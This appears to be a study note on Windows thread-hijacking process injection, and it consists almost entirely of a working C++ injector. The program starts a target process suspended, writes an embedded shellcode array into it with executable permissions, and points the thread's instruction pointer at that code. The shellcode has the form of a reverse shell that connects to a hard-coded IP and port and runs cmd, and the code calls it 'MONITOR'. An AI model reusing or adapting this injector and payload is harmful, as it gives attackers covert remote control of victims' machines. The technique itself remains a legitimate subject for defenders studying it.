### Thread Highjacking - Remote Thread(within other process, some module, created by Target Process)

idea : highjack the thread within target for a few secs(random between 2-5 secs/ 2000-5000ms) and run whenever the target is triggered. target thread can be chosen which is called often - adding some un-predictability...

❗Using windows env var's to identify specific system file paths.

Shellcode was created as a separate memory block via the target process and then was injected into the main thread by `Rip` context var manipulation.

❗Ideally we'd pick a non-important background thread .... thread-enumeration. Discussed afterwards.

```cpp
#define _CRT_SECURE_NO_WARNINGS 1


#include <Windows.h>
//#include "resource.h"
#include <iostream>
#include <bcrypt.h>
#include <string>
#include <vector>;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
//#define ERROR_INVALID_PARAMETER 87L;
#include <stdio.h>
#include <psapi.h>

using namespace std;

BOOL CreateSuspendedProcess(const char* lpProcessName, DWORD* pdwProcessId, HANDLE* phProcess, HANDLE* phThread) {
	if (!lpProcessName || !pdwProcessId || !phProcess || !phThread) {
		cerr << "[!] Invalid parameter(s) passed to CreateSuspendedProcess." << endl;
		return false;
	}

	char windir[MAX_PATH] = { 0 };
	DWORD envRet = GetEnvironmentVariableA("WINDIR", windir, MAX_PATH);
	if (envRet == 0 || envRet > MAX_PATH) {
		cerr << "[!] GetEnvironmentVariableA failed with error: " << GetLastError() << endl;
		return false;
	}

	string fullPath = string(windir) + "\\System32\\" + lpProcessName;
	cout << "\n\t[i] Running: \"" << fullPath << "\" ... ";

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	si.cb = sizeof(STARTUPINFOA);

	// CreateProcessA requires a mutable command line string
	string commandLine = fullPath;

	if (!CreateProcessA(
		nullptr,                        // lpApplicationName
		&commandLine[0],                // lpCommandLine (mutable)
		nullptr,                        // lpProcessAttributes
		nullptr,                        // lpThreadAttributes
		FALSE,                          // bInheritHandles
		CREATE_SUSPENDED,               // dwCreationFlags
		nullptr,                        // lpEnvironment
		nullptr,                        // lpCurrentDirectory
		&si,                            // lpStartupInfo
		&pi)) {                         // lpProcessInformation

		cerr << "[!] CreateProcessA failed with error: " << GetLastError() << endl;
		return false;
	}

	cout << "[+] DONE" << endl;

	// Populate output pointers
	*pdwProcessId = pi.dwProcessId;
	*phProcess = pi.hProcess;
	*phThread = pi.hThread;

	// Verify outputs
	if (*pdwProcessId != 0 && *phProcess != nullptr && *phThread != nullptr)
		return true;

	return false;
}

bool InjectShellcodeToRemoteProcess(
	HANDLE hProcess,
	PBYTE pShellcode,
	SIZE_T sSizeOfShellcode,
	PVOID* ppAddress)   // out: address in remote process
{
	if (hProcess == NULL || pShellcode == nullptr || sSizeOfShellcode == 0 || ppAddress == nullptr) {
		cerr << "[!] Invalid parameter(s) passed to InjectShellcodeToRemoteProcess.\n";
		return false;
	}

	SIZE_T sNumberOfBytesWritten = 0;
	DWORD  dwOldProtection = 0;

	// Allocate memory in the remote process (initially RW)
	*ppAddress = VirtualAllocEx(hProcess, nullptr, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == nullptr) {
		cerr << "\n\t[!] VirtualAllocEx Failed With Error : " << GetLastError() << "\n";
		return false;
	}
	cout << "[i] Allocated Memory At : " << hex << *ppAddress << dec << " \n";

	// Write shellcode to the allocated memory
	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) ||
		sNumberOfBytesWritten != sSizeOfShellcode) {
		cerr << "\n\t[!] WriteProcessMemory Failed With Error : " << GetLastError() << "\n";
		// cleanup allocation
		VirtualFreeEx(hProcess, *ppAddress, 0, MEM_RELEASE);
		*ppAddress = nullptr;
		return false;
	}

	// Change protection to executable (and readable/writable as requested)
	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		cerr << "\n\t[!] VirtualProtectEx Failed With Error : " << GetLastError() << "\n";
		// cleanup allocation
		VirtualFreeEx(hProcess, *ppAddress, 0, MEM_RELEASE);
		*ppAddress = nullptr;
		return false;
	}

	return true;
}

bool HijackThread(HANDLE hThread, PVOID pAddress) {
	if (hThread == nullptr || pAddress == nullptr) {
		cerr << "[!] Invalid parameter(s) passed to HijackThread.\n";
		return false;
	}

	// Zero the CONTEXT structure and request control registers only
	CONTEXT ThreadCtx;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_CONTROL;

	// Get the thread context (thread should usually be suspended by caller)
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		cerr << "\n\t[!] GetThreadContext Failed With Error : " << GetLastError() << "\n";
		return false;
	}

	// Update the instruction pointer depending on architecture
#ifdef _M_X64
	ThreadCtx.Rip = reinterpret_cast<ULONG_PTR>(pAddress);
#else
	ThreadCtx.Eip = static_cast<DWORD>(reinterpret_cast<ULONG_PTR>(pAddress));
#endif

	// Set the modified context back to the thread
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		cerr << "\n\t[!] SetThreadContext Failed With Error : " << GetLastError() << "\n";
		return false;
	}

	// Resume the thread so it executes our payload, then wait for it to finish
	DWORD resumeResult = ResumeThread(hThread);
	if (resumeResult == (DWORD)-1) {
		cerr << "\n\t[!] ResumeThread Failed With Error : " << GetLastError() << "\n";
		return false;
	}

	WaitForSingleObject(hThread, INFINITE);

	return true;
}


BYTE PAYLOAD[] = {
	0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41,
	0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48,
	0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f,
	0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c,
	0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
	0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b,
	0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0,
	0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56,
	0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9,
	0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
	0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58,
	0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
	0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0,
	0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a,
	0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
	0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32,
	0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec,
	0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x23, 0x1d,
	0xc0, 0xa8, 0xc8, 0x81, 0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41,
	0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01,
	0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x50, 0x50,
	0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48,
	0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5,
	0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9,
	0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x48, 0x81, 0xc4, 0x40, 0x02,
	0x00, 0x00, 0x49, 0xb8, 0x63, 0x6d, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 
	0x50, 0x41, 0x50, 0x48, 0x89, 0xe2, 0x57, 0x57, 0x57, 0x4d, 0x31, 0xc0, 0x6a, 
	0x0d, 0x59, 0x41, 0x50, 0xe2, 0xfc, 0x66, 0xc7, 0x44, 0x24, 0x54, 0x01, 0x01, 
	0x48, 0x8d, 0x44, 0x24, 0x18, 0xc6, 0x00, 0x68, 0x48, 0x89, 0xe6, 0x56, 0x50, 
	0x41, 0x50, 0x41, 0x50, 0x41, 0x50, 0x49, 0xff, 0xc0, 0x41, 0x50, 0x49, 0xff, 
	0xc8, 0x4d, 0x89, 0xc1, 0x4c, 0x89, 0xc1, 0x41, 0xba, 0x79, 0xcc, 0x3f, 0x86, 
	0xff, 0xd5, 0x48, 0x31, 0xd2, 0x48, 0xff, 0xca, 0x8b, 0x0e, 0x41, 0xba, 0x08, 
	0x87, 0x1d, 0x60, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 
	0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 
	0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 
	0x41, 0x89, 0xda, 0xff, 0xd5
};

VOID DummyFunction() {
	cout << "Rock hard pecs" << endl;
}

int main(int argc, char* argv[]) {
	const char* targetProcess = (argc > 1 && argv[1] != nullptr) ? argv[1] : "notepad.exe";

	const PBYTE MONITOR = PAYLOAD;
	const SIZE_T MONITOR_SIZE = sizeof(PAYLOAD);

	DWORD pid = 0;
	HANDLE hProc = nullptr;
	HANDLE hThread = nullptr;
	PVOID remoteAddr = nullptr;

	cout << "[*] Target process: " << targetProcess << "\n";

	// 1) Create suspended process
	cout << "[*] Creating suspended process...\n";
	if (!CreateSuspendedProcess(targetProcess, &pid, &hProc, &hThread)) {
		cerr << "[-] CreateSuspendedProcess failed.\n";
		return 1;
	}
	cout << "[+] Created process PID=" << pid << " hProc=" << hProc << " hThread=" << hThread << "\n";

	// 2) Inject MONITOR shellcode into the remote process
	cout << "[*] Injecting MONITOR shellcode (" << MONITOR_SIZE << " bytes)...\n";
	if (!InjectShellcodeToRemoteProcess(hProc, MONITOR, MONITOR_SIZE, &remoteAddr)) {
		cerr << "[-] InjectShellcodeToRemoteProcess failed. Cleaning up...\n";
		if (hThread) CloseHandle(hThread);
		if (hProc) CloseHandle(hProc);
		return 2;
	}
	cout << "[+] Injected at remote address: " << remoteAddr << "\n";

	// 3) Hijack the thread to the injected shellcode and resume it
	cout << "[*] Hijacking thread to remote shellcode and resuming...\n";
	if (!HijackThread(hThread, remoteAddr)) {
		cerr << "[-] HijackThread failed. Attempting to free remote allocation and cleanup...\n";
		if (remoteAddr) VirtualFreeEx(hProc, remoteAddr, 0, MEM_RELEASE);
		if (hThread) CloseHandle(hThread);
		if (hProc) CloseHandle(hProc);
		return 3;
	}
	cout << "[+] Thread hijacked. Monitoring shellcode should be running in target process.\n";

	// Option: wait for the target process to exit (or implement other logic)
	cout << "[*] Waiting for target process to exit...\n";
	WaitForSingleObject(hProc, INFINITE);

	cout << "[+] Target process exited. Cleaning up handles...\n";

	// Clean up handles
	if (hThread) CloseHandle(hThread);
	if (hProc) CloseHandle(hProc);

	return 0;
}


const unsigned char EncodedPayload[] = {0x00}; // 0x00007FF7681760A0
```
